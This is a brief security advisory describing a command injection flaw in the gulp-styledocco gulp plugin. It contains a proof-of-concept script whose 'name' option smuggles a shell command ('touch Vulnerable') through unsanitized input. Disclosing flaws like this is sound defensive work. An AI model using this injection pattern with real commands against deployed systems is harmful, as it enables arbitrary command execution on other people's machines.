# Overview
`gulp-styledocco` is a StyleDocco plugin for gulp, this package are vulnerable to Command Injection.

The argument options of the exports function in index.js can be controlled by users without any sanitization.

# Proof of Concept
```
var root = require("gulp-styledocco");
var gulp = require("gulp");
var options = {
  opt: 'docs',
  name: "123\"& touch Vulnerable& \""
}

gulp.src("./gulp-styledocco.js")
  .pipe(root(options));
```